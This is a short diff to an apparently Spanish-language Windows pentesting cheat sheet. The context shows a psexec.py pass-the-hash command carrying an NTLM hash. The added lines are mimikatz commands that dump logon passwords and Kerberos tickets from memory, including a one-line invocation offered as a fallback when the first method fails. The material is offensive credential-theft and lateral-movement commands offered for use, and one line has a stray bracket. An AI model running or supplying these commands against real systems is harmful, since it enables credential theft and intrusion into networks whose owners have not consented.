@@ -85,11 +85,17 @@ psexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:f58b86e89c8631e432cf1a023236
 ````bash
 privilege::debug
 
-sekurlsa::logonpasswords
+[sekurlsa::logonpasswords
 
 sekurlsa::tickets
 
 kerberos::list /export
+````
+
+Si por un casual no nos funcionara probar de esta forma, (importante)
+````bash
+.\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
+
 ````
 
 # PowerShell LDAP Script TGT or TGS
